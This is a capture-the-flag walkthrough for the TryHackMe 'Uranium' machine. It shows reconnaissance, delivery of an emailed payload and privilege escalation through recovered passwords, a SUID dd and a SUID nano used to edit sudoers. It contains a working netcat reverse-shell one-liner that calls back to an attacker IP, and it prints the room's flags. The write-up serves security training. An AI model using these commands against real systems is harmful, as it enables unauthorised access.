CTF URL:https://tryhackme.com/r/room/uranium
# IP
```
10.10.114.49
```
# Reconaisance
## Twitter Account
```
uranium.thm
executes application on terminal
```
## NMAP
```bash
nmap -p- -T4 10.10.114.49 -v

nmap -p22,25,80 -sS -sC -sV 10.10.114.49 -v
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a1:3c:d7:e9:d0:85:40:33:d5:07:16:32:08:63:31:05 (RSA)
|   256 24:81:0c:3a:91:55:a0:65:9e:36:58:71:51:13:6c:34 (ECDSA)
|_  256 c2:94:2b:0d:8e:a9:53:f6:ef:34:db:f1:43:6c:c1:7e (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: uranium, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=uranium
| Subject Alternative Name: DNS:uranium
| Issuer: commonName=uranium
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-09T21:40:53
| Not valid after:  2031-04-07T21:40:53
| MD5:   293d:bef3:2fee:6092:c0d7:2a67:ea27:367c
|_SHA-1: 0a0c:26e0:ae3c:723e:538d:3c21:6b40:c84c:f9e7:8fdb
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Uranium Coin
Service Info: Host:  uranium; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
## Mail server
```bash
telnet uranium.thm 25
HELO aaa
250 uranium

EHLO all
250-uranium
250-PIPELINING
250-SIZE 10240000
250-VRFY
250-ETRN
250-STARTTLS
250-ENHANCEDSTATUSCODES
250-8BITMIME
250-DSN
250 SMTPUTF8


MAIL FROM:example@domain.com
RCPT TO:root
RCPT TO:hakanbey

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.97.245 1236 >/tmp/f' > application


sendEmail -t hakanbey@uranium.thm -f from@attacker.com -s uranium.thm -m "." -u "application" -a application -o tls=no

└─$ nc -lvnp 1236
listening on [any] 1236 ...
connect to [10.8.97.245] from (UNKNOWN) [10.10.114.49] 53350
/bin/sh: 0: can't access tty; job control turned off
$ whoami
hakanbey
$ cat user_1.txt
thm{2aa50e58fa82244213d5438187c0da7c}

```

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# ctrl+z
stty raw -echo; fg
```
# PrivEsc to kral4
```bash
chat_with_kral4 # requires password

/var/log/hakanbey_network_log.pcap
```
Wireshark
```
MBMD1vdpjg3kGv6SsIz56VNG
Hi Kral4
Hi bro
I forget my password, do you know my password ?
Yes, wait a sec I'll send you.
Oh , yes yes I remember. No need anymore. Ty..
Okay bro, take care !
```
chat
```
hakanbey@uranium:~$ ./chat_with_kral4 
PASSWORD :MBMD1vdpjg3kGv6SsIz56VNG
kral4:hi hakanbey

->hi
hakanbey:hi
kral4:how are you?

->bad
hakanbey:bad
kral4:what now? did you forgot your password again

->yes
hakanbey:yes
kral4:okay your password is Mys3cr3tp4sw0rD don't lose it PLEASE
kral4:i have to go
kral4 disconnected

connection terminated

```

```bash
sudo -u kral4 bash
kral4@uranium:/home/kral4$ cat user_2.txt 
thm{804d12e6d16189075db2d45449aeda5f}
```
# PrivEsc to Root or Web
```bash
kral4@uranium:/home/kral4$ find / -user kral4 2>/dev/null

kral4@uranium:/home/kral4$ cat /var/mail/kral4
From root@uranium.thm  Sat Apr 24 13:22:02 2021
Return-Path: <root@uranium.thm>
X-Original-To: kral4@uranium.thm
Delivered-To: kral4@uranium.thm
Received: from uranium (localhost [127.0.0.1])
        by uranium (Postfix) with ESMTP id C7533401C2
        for <kral4@uranium.thm>; Sat, 24 Apr 2021 13:22:02 +0000 (UTC)
Message-ID: <841530.943147035-sendEmail@uranium>
From: "root@uranium.thm" <root@uranium.thm>
To: "kral4@uranium.thm" <kral4@uranium.thm>
Subject: Hi Kral4
Date: Sat, 24 Apr 2021 13:22:02 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-992935.514616878"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-992935.514616878
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in case it happens again.

------MIME delimiter for sendEmail-992935.514616878--


kral4@uranium:/home/kral4$ 

```

```bash
cp /bin/nano /home/kral4
```

```bash
kral4@uranium:/home/kral4$ ls -la /bin/dd
-rwsr-x--- 1 web kral4 76000 Apr 23  2021 /bin/dd


kral4@uranium:/var/www/html$ echo "data" | /bin/dd of=index.html
# works

kral4@uranium:/var/www/html$ ls -la /home/kral4/
total 384
drwxr-x--- 3 kral4 kral4   4096 May  8 15:03 .
drwxr-xr-x 4 root  root    4096 Apr 23  2021 ..
lrwxrwxrwx 1 root  root       9 Apr 25  2021 .bash_history -> /dev/null
-rw-r--r-- 1 kral4 kral4    220 Apr  9  2021 .bash_logout
-rw-r--r-- 1 kral4 kral4   3771 Apr  9  2021 .bashrc
-rwxr-xr-x 1 kral4 kral4 109960 Apr  9  2021 chat_with_hakanbey
-rw-r--r-- 1 kral4 kral4      5 May  8 14:52 .check
drwxrwxr-x 3 kral4 kral4   4096 Apr 10  2021 .local
-rwsrwxrwx 1 root  root  245872 May  8 15:03 nano
-rw-r--r-- 1 kral4 kral4    807 Apr  9  2021 .profile
-rw-rw-r-- 1 kral4 kral4     38 Apr 10  2021 user_2.txt

kral4@uranium:/home/kral4$ ./nano /etc/sudoers
# add
hakanbey        ALL=(ALL:ALL) ALL

root@uranium:~# cat root.txt 
thm{81498047439cc0426bafa1db5da699cd}
root@uranium:~# cd /var/www/html/
root@uranium:/var/www/html# cat web_fla
thm{019d332a6a223a98b955c160b3e6750a}
```